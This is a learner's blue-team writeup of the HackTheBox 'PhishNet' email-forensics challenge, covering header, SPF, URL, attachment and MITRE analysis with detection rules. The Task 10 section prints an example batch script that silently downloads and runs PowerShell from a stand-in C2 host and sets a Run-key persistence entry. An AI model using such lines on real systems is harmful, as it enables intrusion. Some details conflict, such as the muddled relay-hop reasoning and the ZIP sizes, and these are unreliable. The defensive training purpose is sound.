# PhishNet - HackTheBox Sherlock Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Type](https://img.shields.io/badge/Type-Email%20Forensics-blue)
![Category](https://img.shields.io/badge/Category-Blue%20Team-blueviolet)

---

## Summary

**Platform:** HackTheBox - Sherlocks  
**Challenge Name:** PhishNet  
**Difficulty:** Easy  
**Category:** Email Forensics / Phishing Investigation  
**Date Completed:** 2025-11-16  
**Time Taken:** 1 Hour

**Quick Overview:**  
This Sherlock simulates a real-world phishing incident where an accounting team receives a seemingly urgent payment request from a vendor. The email appears legitimate but contains a malicious .zip attachment hiding malware. The investigation requires analyzing email headers, identifying spoofed domains, examining file attachments, and extracting indicators of compromise (IOCs).

**Key Skills Demonstrated:**
- Email header analysis (SMTP headers, SPF validation)
- Phishing detection and URL analysis
- File forensics (ZIP archive analysis, file extension spoofing)
- Hash calculation and malware identification
- MITRE ATT&CK framework mapping
- Incident response methodology

---

## Investigation Scenario

**Scenario Provided by HTB:**

> "An accounting team receives an urgent payment request from a known vendor. The email appears legitimate but contains a suspicious link and a .zip attachment hiding malware. Your task is to analyze the email headers, and uncover the attacker's scheme."

**Victim Context:**
- Target: Accounting Department
- Lure: Urgent invoice payment request
- Social Engineering: Urgency + legitimate-looking sender

---

## Investigation Goals & Questions

This investigation aims to answer 11 critical questions about the phishing attack:

1. ✅ What is the originating IP address of the sender?
2. ✅ Which mail server relayed this email before reaching the victim?
3. ✅ What is the sender's email address?
4. ✅ What is the 'Reply-To' email address specified in the email?
5. ✅ What is the SPF (Sender Policy Framework) result for this email?
6. ✅ What is the domain used in the phishing URL inside the email?
7. ✅ What is the fake company name used in the email?
8. ✅ What is the name of the attachment included in the email?
9. ✅ What is the SHA-256 hash of the attachment?
10. ✅ What is the filename of the malicious file contained within the ZIP attachment?
11. ✅ Which MITRE ATT&CK techniques are associated with this attack?

---

## Tools Used

- **`cat`** - View raw email file
- **`file`** - Identify file types
- **`grep`** - Search email headers for specific fields
- **`base64`** - Decode base64-encoded email attachments
- **`exiftool`** - Analyze ZIP file metadata and contents
- **CyberChef** - Decode base64, calculate hashes
- **Text editor** - Parse email headers and HTML body

---

## Methodology & Analysis

### Step 1: Initial Triage & Evidence Collection

**Objective:** Understand what evidence we have and prepare for analysis.

**Actions Taken:**
```bash
# List evidence files
ls -lah

# Identify file type
file email.eml
```

**Output:**
```
email.eml: SMTP mail, ASCII text, with CRLF line terminators
```

**What I found:**
The evidence package contained a single file named `email.eml`, which is a raw email message file in standard SMTP format. This file contains the complete email including headers, body content, and base64-encoded attachments. The CRLF (Carriage Return + Line Feed) line terminators indicate proper email formatting standards.

---

### Step 2: Email Header Analysis

**Objective:** Extract critical metadata from email headers to identify sender, mail servers, and authentication results.

#### Task 1: Identify Sender's Originating IP Address

**Methodology:**
```bash
# View raw email
cat email.eml

# Search for X-Originating-IP or X-Sender-IP headers
cat email.eml | grep -i "X-Sender-IP\|X-Originating-IP"
```

**Analysis:**
When investigating the `email.eml` file, I focused on the custom email headers that mail servers add to track message origin. The `X-Sender-IP` header is a non-standard but commonly used header that identifies the true originating IP address of the sender. 

In this case, the header revealed `45.67.89.10` as the source IP. This is significant because:
- The IP doesn't belong to any known legitimate business mail infrastructure
- It represents the actual machine that initiated the phishing campaign
- This IP can be checked against threat intelligence databases for reputation scoring

**Screenshot:**
![Sender IP Header](images/PhishNet_1.png)
*Email headers showing X-Sender-IP field with originating address*

**Finding:**
- **Sender IP:** `45.67.89.10`
- **Significance:** This IP represents the true origin point of the phishing email. In a real SOC environment, this IP would be immediately checked against:
  - Threat intelligence feeds (AbuseIPDB, Talos Intelligence)
  - Geolocation services (to verify if the location matches expected sender)
  - SIEM logs (to check for other suspicious activity from this IP)

**Answer to Task 1:** `45.67.89.10`

---

#### Task 2: Identify Mail Relay Server

**Objective:** Determine which mail server relayed this email before it reached the victim.

**Methodology:**
```bash
# Look for Received headers showing mail relay path
cat email.eml | grep "Received:"
```

**Analysis:**
Email messages pass through multiple mail servers (called "hops") before reaching the recipient. Each server adds a `Received:` header, creating a chronological trail of the email's journey. In this investigation, the email headers showed 3 "Received" entries:

1. **First hop:** `mail.business-finance.com` - The attacker's origin server
2. **Second hop:** `relay.business-finance.com` - Intermediate relay server  
3. **Third hop:** `finance@business-finance.com` - Final relay before victim

To identify the last relay server before the victim received the email, I examined the timestamps in the `Received` headers. The earliest timestamp (first to process the email) corresponds to the last server in the chain before delivery. This was the server at IP address `203.0.113.25`.

**Screenshot:**
![Mail Relay Headers](images/PhishNet_2.png)
*Received headers showing mail relay path with timestamps*

**Key Finding:**
The first `Received:` header in the email (which represents the last relay hop) shows:
```
Received: from mail.business-finance.com ([203.0.113.25])
    by mail.target.com (Postfix) with ESMTP id ABC123;
    Mon, 26 Feb 2025 10:15:00 +0000 (UTC)
```

By analyzing the chronological order of timestamps, `203.0.113.25` was confirmed as the final relay server before the victim's mail server accepted the message.

**Answer to Task 2:** `203.0.113.25`

---

#### Task 3: Extract Sender's Email Address

**Methodology:**
```bash
# Look for From: header
cat email.eml | grep "From:"
```

**Screenshot:**
![Sender Email Address](images/PhishNet_3.png)
*From: header highlighted showing sender email*

**Analysis:**
The `From:` field contains two components:
```
From: "Finance Dept" <finance@business-finance.com>
```

The display name ("Finance Dept") is designed to appear legitimate to users, while the actual email address is `finance@business-finance.com`. 

This email is suspicious for several reasons:
1. **Generic naming:** Real companies typically use specific department names or individual names
2. **Domain concern:** While the domain `business-finance.com` can pass SPF authentication (indicating the sender is authorized to send from that domain), this only verifies technical authorization, not legitimacy. The attacker likely registered or compromised this entire domain.
3. **SPF limitation:** SPF only checks if the sending server is authorized for that domain - it doesn't verify if the domain itself is trustworthy or if it's impersonating another organization.

**Answer to Task 3:** `finance@business-finance.com`

---

#### Task 4: Identify Reply-To Address

**Objective:** Attackers often set Reply-To to a different address to receive victim responses.

**Methodology:**
```bash
# Search for Reply-To header
cat email.eml | grep "Reply-To:"
```

**Finding:**
```
Reply-To: <support@business-finance.com>
```

**Analysis:**
The Reply-To address (`support@business-finance.com`) differs from the From address (`finance@business-finance.com`), which is a common phishing tactic. Here's why attackers use this technique:

1. **Response Collection:** When a victim replies to the email, the response goes to the Reply-To address instead of the From address. This allows attackers to:
   - Use different email accounts for different stages of the attack
   - Separate "sending" infrastructure from "receiving" infrastructure
   - Make tracking more difficult for investigators

2. **Social Engineering:** Using different addresses for different purposes can make the email appear more legitimate:
   - "Finance Dept" sends the invoice → seems official
   - "Support" handles replies → seems like proper corporate structure

3. **Operational Security:** If the sending address gets flagged or blocked, the Reply-To address might still work, allowing the attacker to maintain communication with victims.

This tactic is classified under **MITRE ATT&CK T1566.002 (Spearphishing Link)** social engineering techniques, where attackers manipulate email headers to increase the likelihood of victim engagement.

**Screenshot:**
![Reply-To Header](images/PhishNet_4.png)

**Answer to Task 4:** `support@business-finance.com`

---

#### Task 5: Check SPF Authentication Result

**Objective:** Verify if the email passed Sender Policy Framework (SPF) validation.

**Background on SPF:**
SPF is an email authentication method that helps prevent email spoofing. It allows domain owners to specify which mail servers are authorized to send emails on behalf of their domain.

**Methodology:**
```bash
# Look for Authentication-Results or Received-SPF headers
cat email.eml | grep -i "SPF\|Authentication-Results"
```

**Screenshot:**
![SPF Check Result](images/PhishNet_5.png)
*Red text showing "Received-SPF: Pass"*

**Finding:**
```
Received-SPF: Pass (protection.outlook.com: domain of business-finance.com designates 45.67.89.10 as permitted sender)
```

**Analysis:**
The SPF check showing "Pass" is particularly interesting and demonstrates a critical misunderstanding many people have about email security:

**What SPF Actually Validates:**
- SPF confirms that the sending mail server (IP: 45.67.89.10) is authorized in the DNS records of `business-finance.com` to send emails for that domain
- This means the attacker either:
  1. **Registered the entire domain** `business-finance.com` and configured proper SPF records
  2. **Compromised the domain** and modified its DNS/SPF records

**Why SPF "Pass" Doesn't Mean "Safe":**
- SPF only validates the technical relationship between the IP and domain
- It does NOT verify:
  - Whether the domain is legitimate or malicious
  - Whether the domain is impersonating another organization
  - Whether the email content is malicious
  - Whether attachments are safe

**Critical Security Lesson:**
This attack demonstrates why **SPF alone is insufficient** for email security. Organizations should implement:
1. **DMARC (Domain-based Message Authentication, Reporting, and Conformance):** Adds alignment checks between From and Return-Path domains
2. **DKIM (DomainKeys Identified Mail):** Cryptographically signs emails to verify they haven't been tampered with
3. **Domain reputation checks:** Query threat intelligence feeds for newly registered or suspicious domains
4. **Content filtering:** Analyze email body, attachments, and URLs regardless of authentication results

In this case, the attacker successfully bypassed SPF-only defenses by controlling the entire sending infrastructure, highlighting the importance of defense-in-depth strategies.

**Answer to Task 5:** `pass`

---

### Step 3: Email Body & Phishing URL Analysis

**Objective:** Analyze the email content to identify social engineering tactics and malicious URLs.

#### Task 6: Extract Phishing Domain from URL

**Methodology:**
```bash
# View email body (HTML portion)
cat email.eml | grep -A 50 "<html>"
```

**Screenshot:**
![Email Body with Malicious URL](images/PhishNet_6.png)
*HTML body showing phishing link with domain "secure.business-finance.com" highlighted*

**Email Body Content:**
```html
<p><a href="https://secure.business-finance.com/invoice/details/view/INV2025-0987/payment">Download Invoice</a></p>
```

**Analysis:**
The phishing URL reveals several red flags commonly used in social engineering attacks:

**Subdomain Analysis:**
- The use of "secure" as a subdomain is a classic attacker tactic designed to:
  1. **Create false trust:** Users associate "secure" with safety and legitimacy
  2. **Mimic legitimate patterns:** Real companies do use "secure" subdomains for payment portals
  3. **Bypass visual inspection:** At first glance, "secure.business-finance.com" looks more trustworthy than just "business-finance.com"

**URL Structure Deception:**
The full URL path (`/invoice/details/view/INV2025-0987/payment`) is deliberately crafted to:
- **Appear legitimate:** Mimics real invoice management system URLs
- **Include invoice number:** `INV2025-0987` adds specificity and urgency
- **Suggest payment action:** The `/payment` endpoint implies immediate financial action is needed

**What Would Happen if Clicked:**
If a victim clicked this URL, they would likely encounter:
1. **Credential harvesting page:** Fake login form to steal email/password
2. **Malware download:** Secondary payload delivery
3. **Payment fraud:** Fake payment portal to steal financial information
4. **Redirection chain:** Multiple redirects to evade URL reputation systems

**Defense Recommendation:**
SOC analysts should implement URL analysis that checks:
- Recently registered domains (<90 days)
- Subdomains using trust-inducing terms (secure, login, portal, verify)
- URLs with suspicious paths containing financial keywords (payment, invoice, transaction)

**Answer to Task 6:** `secure.business-finance.com`

---

#### Task 7: Identify Fake Company Name

**Screenshot:**
![Email Body Showing Company Name](images/PhishNet_7.png)
*Email signature showing "Business Finance Ltd." highlighted*

**Finding:**
The email signature shows:
```html
<p>Best regards,<br>
<b>Finance Department</b><br>
Business Finance Ltd.</p>
```

**Analysis:**
The company name "Business Finance Ltd." is a textbook example of phishing social engineering:

**Why This Name is Suspicious:**
1. **Generic nomenclature:** Real companies rarely use such broad, generic names. Compare "Business Finance Ltd." to legitimate companies like "Acme Corporation" or "TechCorp Industries" - legitimate businesses brand themselves with unique, memorable names.

2. **Vague industry reference:** The name references "business" and "finance" without any specificity, making it applicable to almost any target. This allows the attacker to use the same phishing template against multiple organizations.

3. **"Ltd." designation:** Using "Limited" or "Ltd." adds an air of legitimacy and international presence, but it's too generic to verify. Real companies would include location (e.g., "Business Finance Ltd., UK") or use more specific legal designations.

4. **No brand identity:** There's no unique branding, logo, or distinctive characteristics that would allow victims to verify the company's legitimacy through a quick web search.

**Social Engineering Purpose:**
By using a generic name, the attacker ensures:
- The email doesn't claim to be from a well-known company (which would be easier to verify as fake)
- Victims might assume it's a legitimate third-party vendor they're not familiar with
- The name sounds professional enough to pass casual scrutiny
- It's less likely to trigger brand-protection mechanisms that detect impersonation of known companies

**Real-World Impact:**
In actual phishing campaigns, attackers often research their targets and use company names similar to actual vendors the victim organization works with. The generic nature of "Business Finance Ltd." suggests this might be a mass-phishing campaign rather than a targeted spearphishing attack.

**Answer to Task 7:** `Business Finance Ltd.`

---

### Step 4: Attachment Analysis & Malware Discovery

**Objective:** Extract and analyze the email attachment to identify malware.

#### Task 8: Identify Attachment Filename

**Methodology:**
The email contains a base64-encoded attachment. First, I identified the attachment section in the raw email:

```bash
# Look for Content-Type: application/zip
cat email.eml | grep -A 5 "Content-Type: application/zip"
```

**Screenshot:**
![Email Attachment Section](images/PhishNet_8.png)
*Email showing attachment metadata with filename "Invoice_2025_Payment.zip"*

**Finding:**
```
Content-Type: application/zip; name="Invoice_2025_Payment.zip"
Content-Disposition: attachment; filename="Invoice_2025_Payment.zip"
Content-Transfer-Encoding: base64
```

**Analysis:**
The attachment metadata reveals several important details:

1. **Filename structure:** `Invoice_2025_Payment.zip`
   - Uses current year (2025) to appear recent and relevant
   - Includes "Invoice" and "Payment" keywords that accounting staff expect
   - Professional naming convention increases likelihood of being opened

2. **File format:** ZIP archive
   - Common business format for sharing multiple documents
   - Often bypasses basic email security filters (unlike direct .exe attachments)
   - Allows hiding malicious files inside what appears to be a document package

3. **Encoding method:** Base64
   - Standard encoding for email attachments (required by SMTP protocol)
   - Binary data encoded as ASCII text for transmission
   - Must be decoded to analyze the actual file contents

**Why ZIP Files Are Effective in Phishing:**
- Compression makes files smaller for faster email transmission
- Some email gateways don't scan inside password-protected ZIPs
- Users trust ZIP files as standard business communication
- Allows attackers to include multiple malicious files or decoy documents

**Answer to Task 8:** `Invoice_2025_Payment.zip`

---

#### Task 9: Calculate SHA-256 Hash of Attachment

**Objective:** Generate a cryptographic hash for threat intelligence and malware identification.

**Methodology:**

**Step 1:** Extract base64-encoded attachment from email
```bash
# Extract attachment between boundary markers
cat email.eml | sed -n '/^UEsDBBQAAAAIABh\//,/^--boundary123--$/p' > attachment_base64.txt
```

**Step 2:** Decode base64 to get ZIP file
```bash
base64 -d attachment_base64.txt > Invoice_2025_Payment.zip

# Verify file type
file Invoice_2025_Payment.zip
```

**Step 3:** Calculate SHA-256 hash
```bash
sha256sum Invoice_2025_Payment.zip
```

**Alternative: Using CyberChef**

I also used CyberChef for a visual approach, which is helpful when documenting investigations:

**Screenshot:**
![CyberChef Hash Calculation](images/PhishNet_9.png)
*CyberChef showing From Base64 → SHA-256 recipe with output hash*

**CyberChef Recipe:**
1. **From Base64** - Decode the base64 string to recover binary file
2. **SHA2** (variant: 256, rounds: 64) - Calculate cryptographic hash

**Result:**
```
8379c41239e9af845b2ab6c27a7509ae8804d7d73e455c800a551b22ba25bb4a
```

**Analysis:**
The SHA-256 hash serves multiple critical purposes in incident response:

1. **Malware Identification:**
   - This hash can be queried in malware databases (VirusTotal, Hybrid Analysis, Any.Run)
   - If this file has been seen before, we can retrieve existing analysis reports
   - Helps determine if this is part of a known campaign or threat actor group

2. **Threat Intelligence Sharing:**
   - Hashes are safely shareable (unlike actual malware samples)
   - Security communities use hashes to track malware distribution
   - Enables rapid detection across multiple organizations

3. **SIEM/EDR Integration:**
   - Hash can be added to block lists across endpoints
   - Automated alerts trigger if this file appears anywhere in the environment
   - Provides forensic evidence of file presence or absence

4. **Cryptographic Verification:**
   - SHA-256 is a one-way function - impossible to reverse-engineer the file from the hash
   - Any modification to the file (even one bit) completely changes the hash
   - Proves file integrity for legal/forensic purposes

**Real-World Use Case:**
In a SOC environment, I would immediately:
- Query VirusTotal API for this hash
- Check internal SIEM for any previous occurrences
- Add to YARA rules for proactive detection
- Share with ISAC (Information Sharing and Analysis Centers)

**Answer to Task 9:** `8379c41239e9af845b2ab6c27a7509ae8804d7d73e455c800a551b22ba25bb4a`

---

#### Task 10: Discover Hidden Malware Filename

**Objective:** Identify the actual malicious file hidden inside the ZIP archive.

**Methodology:**

**Using `exiftool` to inspect ZIP contents:**
```bash
# Install exiftool if not available
sudo apt install exiftool -y

# Analyze ZIP file metadata and contents
exiftool Invoice_2025_Payment.zip
```

**Screenshot:**
![ExifTool ZIP Analysis](images/PhishNet_10.png)
*ExifTool output showing "Zip File Name: invoice_document.pdf.bat"*

**Output:**
```
ExifTool Version Number  : 13.10
File Name                : Invoice_2025_Payment.zip
Directory                : .
File Size                : 75 bytes
File Modification Date/Time : 2025:11:16 17:34:23+00:00
...
Zip Required Version     : 20
Zip Bit Flag             : 0
Zip Compression          : Deflated
Zip Modify Date          : 2025:02:26 15:56:48
Zip CRC                  : 0x2a8e3d17
Zip Compressed Size      : 1240907
Zip Uncompressed Size    : 1690811
Zip File Name            : invoice_document.pdf.bat
```

**Critical Discovery:** The filename is `invoice_document.pdf.bat` 🚩

**Analysis - The Double Extension Attack:**

This is a **classic and highly effective** file extension spoofing technique that exploits Windows file handling behavior:

**How the Attack Works:**

1. **Windows Extension Hiding (Default Behavior):**
   - By default, Windows File Explorer hides "known file extensions"
   - Setting: `Folder Options → View → "Hide extensions for known file types"` (enabled by default)
   - This means users don't see the full filename

2. **What the Victim Sees:**
   ```
   Desktop View:  invoice_document.pdf  [📄 PDF icon]
   Actual File:   invoice_document.pdf.bat  [⚙️ BAT executable]
   ```

3. **Visual Deception:**
   - Windows shows PDF icon (based on .pdf in the name)
   - Filename appears to end in `.pdf`
   - User believes they're opening a safe document
   - **In reality:** Clicking executes a Windows Batch script

**What Happens When Executed:**

A `.bat` (Batch) file is a Windows script that can:
- Download additional malware from command & control servers
- Execute PowerShell commands
- Steal credentials from browsers/keychain
- Establish persistence (auto-run on startup)
- Disable antivirus software
- Exfiltrate sensitive documents
- Install ransomware

**Example Malicious BAT Script:**
```batch
@echo off
powershell -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://malicious-c2.com/payload.ps1')"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%AppData%\update.bat" /f
```

**Why This Technique is So Effective:**

1. **User Trust:** Users trust PDF files as safe, document-only formats
2. **Visual Confirmation:** The PDF icon reinforces the false belief
3. **Default Settings:** Requires users to manually enable "show extensions" to detect
4. **Low Technical Barrier:** Doesn't require sophisticated exploits or zero-days
5. **Email Gateway Evasion:** Many email filters check final extension (.bat) but attackers use ZIP compression to hide this

**Defense Mechanisms:**

1. **User Training:**
   - Always enable "Show file extensions" in Windows
   - Hover over files to see full name in tooltip
   - Be suspicious of any "document" that runs when double-clicked

2. **Technical Controls:**
   - Block executable extensions (.bat, .cmd, .exe, .scr, .vbs, .ps1) in email attachments
   - Sandbox file execution before allowing downloads
   - Use application whitelisting (only allow approved executables)
   - Implement strict attachment policies (no ZIPs with executables from external senders)

3. **SIEM Detection Rules:**
   ```
   Rule: Double Extension Attack Detection
   - Alert on filenames matching regex: .*\.(pdf|doc|xlsx)\.(bat|exe|cmd|scr|vbs)
   - Priority: CRITICAL
   - Action: Quarantine email, alert SOC Tier 1
   ```

**MITRE ATT&CK Mapping:**
This technique maps to **T1036.007 - Masquerading: Double File Extension**

**Real-World Impact:**
Extension spoofing has been used in major malware campaigns:
- **Locky Ransomware (2016):** `.pdf.exe` attachments
- **Emotet Campaigns (2018-2020):** `.doc.bat` files
- **Agent Tesla (2020-present):** `.pdf.scr` spyware delivery

**Answer to Task 10:** `invoice_document.pdf.bat`

---

### Step 5: MITRE ATT&CK Mapping

**Objective:** Map this attack to the MITRE ATT&CK framework for threat classification.

#### Task 11: Identify Associated ATT&CK Techniques

**Analysis:**

Based on the comprehensive analysis of this phishing attack, I identified multiple MITRE ATT&CK techniques at play. However, the primary and most relevant technique is:

**Primary Technique: T1566.001 - Phishing: Spearphishing Attachment**

**Why T1566.001 Applies:**

From the MITRE ATT&CK framework description:
> "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email."

**This attack demonstrates all characteristics of T1566.001:**

1. **Email as Initial Vector:** The attack begins with a phishing email sent to the accounting team
2. **Malicious Attachment:** Contains `Invoice_2025_Payment.zip` with hidden malware
3. **Social Engineering:** Uses urgency ("overdue invoice") and authority ("Finance Dept") to compel action
4. **Targeted Audience:** Specifically targets accounting/finance personnel likely to process invoices
5. **Malware Delivery:** The attachment contains `invoice_document.pdf.bat` executable

**Additional Relevant Techniques (Full Attack Chain):**

While not requested in the challenge, a complete analysis would include:

| MITRE ID | Technique | How It Applies in This Attack |
|----------|-----------|-------------------------------|
| **T1566.001** | Phishing: Spearphishing Attachment | Primary initial access method |
| T1566.002 | Phishing: Spearphishing Link | Malicious URL in email body (secure.business-finance.com) |
| T1204.002 | User Execution: Malicious File | Requires victim to open the .bat file |
| T1036.007 | Masquerading: Double File Extension | `.pdf.bat` extension spoofing |
| T1071.001 | Application Layer Protocol: Web Protocols | Likely uses HTTPS for C2 communication |
| T1564.001 | Hide Artifacts: Hidden Files | Windows hides .bat extension by default |

**Why T1566.001 is the Primary Answer:**

The challenge asks which MITRE ATT&CK technique is "associated with this attack." In the context of SOC analysis and threat classification:

- **T1566.001** represents the **Initial Access** tactic - how the attacker first compromises the environment
- This is the most critical technique for threat intelligence and detection engineering
- Other techniques (execution, masquerading) are secondary and wouldn't occur without the initial phishing attachment
- When logging incidents in a SIEM or ticketing system, **Initial Access techniques** are the primary classification

**Real-World SOC Application:**

In a production SOC environment, I would:

1. **Tag the incident** with T1566.001 in the SIEM
2. **Create detection rules** for similar attachment patterns:
   ```
   Rule Name: T1566.001 - ZIP Attachment with Executable
   Logic: 
     - Email from external sender
     - Contains .zip attachment
     - ZIP contains .bat/.exe/.cmd/.scr file
     - Subject contains urgency keywords
   Action: Quarantine, Alert Tier 1 SOC
   ```
3. **Update threat intelligence feeds** with IOCs
4. **Brief end users** on this specific T1566.001 variant

**Answer to Task 11:** `T1566.001`

---

## Complete Attack Timeline

| Timestamp | Event | Evidence Source | Indicator |
|-----------|-------|-----------------|-----------|
| 2025-02-26 10:15:00 UTC | Phishing email sent from attacker IP | Email headers (X-Sender-IP) | IP: 45.67.89.10 |
| 2025-02-26 10:15:00 UTC | Email relayed through mail server | Email headers (Received) | Server: 203.0.113.25 |
| 2025-02-26 10:15:00 UTC | Email delivered to victim inbox | Email headers (To:) | Recipient: accounts@globalaccounting.com |
| N/A | Victim opens email | Email body | Social engineering: urgency, fake invoice |
| N/A | Victim clicks phishing URL (optional) | HTML body | URL: secure.business-finance.com |
| N/A | Victim downloads ZIP attachment | Email attachment | File: Invoice_2025_Payment.zip |
| N/A (if executed) | Malware execution | ZIP contents | BAT script: invoice_document.pdf.bat |
| N/A (post-execution) | Command & Control connection | Network traffic | C2 callback to attacker infrastructure |

---

## Indicators of Compromise (IOCs)

### Network IOCs

| Indicator Type | Value | Context |
|----------------|-------|---------|
| Sender IP | `45.67.89.10` | Originating mail server |
| Mail Relay IP | `203.0.113.25` | Intermediate mail server |
| Malicious Domain | `business-finance.com` | Spoofed sender domain |
| Phishing Domain | `secure.business-finance.com` | Malicious URL subdomain |
| Sender Email | `finance@business-finance.com` | Spoofed sender address |
| Reply-To Email | `support@business-finance.com` | Attacker's response inbox |

### File IOCs

| Indicator Type | Value | Description |
|----------------|-------|-------------|
| Filename | `Invoice_2025_Payment.zip` | Malicious ZIP attachment |
| SHA-256 | `8379c41239e9af845b2ab6c27a7509ae8804d7d73e455c800a551b22ba25bb4a` | ZIP file hash |
| Malware Filename | `invoice_document.pdf.bat` | Hidden BAT script (extension spoofing) |
| File Type | Windows Batch Script (.bat) | Executable malware |

### Email IOCs

| Field | Value |
|-------|-------|
| Subject | "Urgent: Invoice Payment Required - Overdue Notice" |
| From Name | "Finance Dept" |
| Organization | "Business Finance Ltd." (fake) |
| Message-ID | `<20250226101500.ABC123@business-finance.com>` |

---

## Detection & Prevention Recommendations

### For SOC Analysts

**Email Gateway Rules:**
1. **Block or quarantine emails with:**
   - Double file extensions (e.g., `.pdf.bat`, `.doc.exe`)
   - ZIP attachments from external senders to finance/accounting
   - Domains recently registered (<30 days)
   
2. **SIEM Correlation Rules:**
   ```
   Rule: Phishing Email with Malicious Attachment
   - Trigger: Email with .bat/.exe/.scr/.vbs extension inside ZIP
   - AND: Sender domain NOT in trusted domain list
   - AND: Subject contains urgency keywords ("urgent", "overdue", "immediately")
   - Action: Alert Tier 1 SOC, quarantine email
   ```

3. **Threat Intelligence Integration:**
   - Automatically check sender IPs against threat feeds
   - Query file hashes against VirusTotal/Malware databases
   - Monitor newly registered domains similar to company name

**User Training Red Flags:**

Users should be trained to recognize these warning signs in phishing emails:

1. **Urgency and Pressure:**
   - "Immediate action required"
   - "Overdue payment"
   - "Account will be suspended"
   - **Why it works:** Creates panic, bypasses rational thinking

2. **Unexpected Attachments:**
   - You weren't expecting an invoice
   - Sender claims you have an overdue payment you don't recognize
   - Attachment format doesn't match expected business documents

3. **Generic Greetings:**
   - "Dear Accounting Team" instead of your actual name
   - No personalization
   - Generic company references

4. **Mismatched Email Addresses:**
   - Display name says "John Smith" but email is `support@random-domain.com`
   - Domain doesn't match known vendor domains
   - Reply-To address differs from From address

5. **Suspicious Links:**
   - Hover over links to see actual URL (don't click!)
   - URLs with "secure" subdomains from unknown companies
   - Misspelled domains (paypa1.com instead of paypal.com)

6. **File Extension Warnings:**
   - Enable "Show file extensions" in Windows
   - Any "document" that executes when opened is malware
   - Double extensions (`.pdf.bat`, `.doc.exe`) are always malicious

**What Users Should Do:**
- **Don't open unexpected attachments** - Contact sender through separate channel to verify
- **Don't click links in suspicious emails** - Type URLs manually or use bookmarks
- **Report to IT/Security** immediately if suspicious email is received
- **Never download files** from unknown senders
- **Verify legitimacy** through known contact information (not from the email itself)

### YARA Rule for Detection

```yara
rule Phishing_Email_With_BAT_Extension_Spoofing
{
    meta:
        description = "Detects phishing emails with .bat files disguised as PDFs"
        author = "Arda Fidancı"
        date = "2025-11-16"
        reference = "HTB Sherlock - PhishNet"
        mitre_attack = "T1566.001, T1036.007"
    
    strings:
        $email_header = "Content-Type: application/zip"
        $double_ext1 = ".pdf.bat"
        $double_ext2 = ".doc.exe"
        $double_ext3 = ".xlsx.scr"
        $double_ext4 = ".doc.cmd"
        $urgency1 = "urgent" nocase
        $urgency2 = "overdue" nocase
        $urgency3 = "immediately" nocase
        $urgency4 = "action required" nocase
    
    condition:
        $email_header and 1 of ($double_ext*) and 1 of ($urgency*)
}
```

### Splunk Query for Detection

```spl
index=email_gateway
| search (attachment_filename="*.pdf.bat" OR attachment_filename="*.doc.exe" OR attachment_filename="*.xlsx.scr")
| eval suspicious_domain=if(match(sender_domain, "(?i)business.*finance|finance.*business|secure.*"), "HIGH", "LOW")
| table _time, sender_email, recipient_email, subject, attachment_filename, sender_ip, suspicious_domain
| lookup threat_intel_ip sender_ip OUTPUT threat_score, threat_category
| where threat_score > 50 OR suspicious_domain="HIGH"
| eval priority="CRITICAL"
| sort - _time
```

---

## Lessons Learned

### What This Investigation Taught Me

**Technical Skills:**

This was my first hands-on email forensics investigation, and it significantly enhanced my understanding of several key areas:

1. **Email Header Analysis:** 
   - Learned how to parse SMTP headers and understand email routing
   - Discovered the difference between authentication (SPF) and legitimacy
   - Gained experience tracing email paths through Received headers

2. **Base64 Encoding/Decoding:**
   - First time manually extracting and decoding email attachments
   - Understanding why email attachments use base64 encoding
   - Using both command-line tools and CyberChef for different analysis workflows

3. **File Forensics:**
   - Learning to use `exiftool` for metadata analysis
   - Understanding ZIP file structure and how malware hides inside archives
   - Calculating and using cryptographic hashes for threat intelligence

4. **Extension Spoofing Awareness:**
   - The `.pdf.bat` discovery was eye-opening - I had heard about this attack but seeing it in practice showed how effective it is
   - Understood why Windows default settings make users vulnerable
   - Realized the importance of user education alongside technical controls

**Most Challenging Aspects:**

1. **Understanding Email Relay Chain:** Initially confused about which "Received" header corresponded to which hop. Learned that headers are added in reverse chronological order (newest first), which helped me properly identify the last relay server.

2. **SPF Confusion:** At first, seeing "SPF: Pass" made me think the email might be legitimate. This challenge taught me that SPF only validates sender authorization, not domain trustworthiness - a critical distinction.

3. **Base64 Extraction:** Manually extracting the attachment from the email body was tricky. Had to learn how MIME boundaries work and how to properly extract just the attachment portion.

**Skills Developed:**

- Email forensics methodology
- OSINT techniques for domain/IP reputation checking
- MITRE ATT&CK framework application
- Technical writing and documentation
- Incident response process thinking

**Key Takeaways:**

1. **SPF "Pass" ≠ Safe Email:** Even if SPF passes, the domain itself can be malicious. Authentication verifies sender authorization, not trustworthiness.

2. **Extension Spoofing is Effective:** The `.pdf.bat` technique is simple but incredibly effective. Most users will never detect it without proper training.

3. **Email Headers Tell the Story:** Critical IOCs live in headers like Received, X-Sender-IP, and Reply-To. Body content alone is insufficient for thorough analysis.

4. **Base64 is Common in Malware:** Email attachments are always base64-encoded for SMTP transmission. SOC analysts must be comfortable decoding and analyzing these.

5. **Urgency = Red Flag:** Phishing emails always create false urgency to bypass rational thinking. "Overdue," "immediate action," and similar phrases should trigger heightened scrutiny.

6. **Defense in Depth is Essential:** No single control would have stopped this attack. Multiple layers (email filtering, user training, endpoint protection, SIEM monitoring) are necessary.

**Real-World Application:**

If this were a real SOC incident, here's how the response would unfold:

**Tier 1 SOC Response (0-30 minutes):**
1. **Initial Alert:** Email gateway flags suspicious attachment
2. **Triage:** Analyst reviews email headers and attachment
3. **Containment:** 
   - Quarantine email from all inboxes
   - Block sender IP (45.67.89.10) at firewall
   - Add domain (business-finance.com) to email blocklist
4. **Ticket Creation:** Open incident ticket, classify as "Phishing - Malicious Attachment"

**Tier 2 SOC Analysis (30 minutes - 2 hours):**
5. **Deep Investigation:**
   - Extract and analyze attachment (as performed in this writeup)
   - Calculate hash, query VirusTotal
   - Check SIEM for any users who received/opened the email
   - Search endpoint logs for malware execution indicators
6. **Scope Determination:**
   - How many users received the email?
   - Did anyone open the attachment?
   - Is there evidence of malware execution?

**Incident Response / Tier 3 (If Malware Executed):**
7. **Isolation:** Disconnect affected machines from network
8. **Forensics:** Memory dump, disk imaging, process analysis
9. **Eradication:** Remove malware, check for persistence mechanisms
10. **Recovery:** Rebuild systems if necessary, restore from clean backups

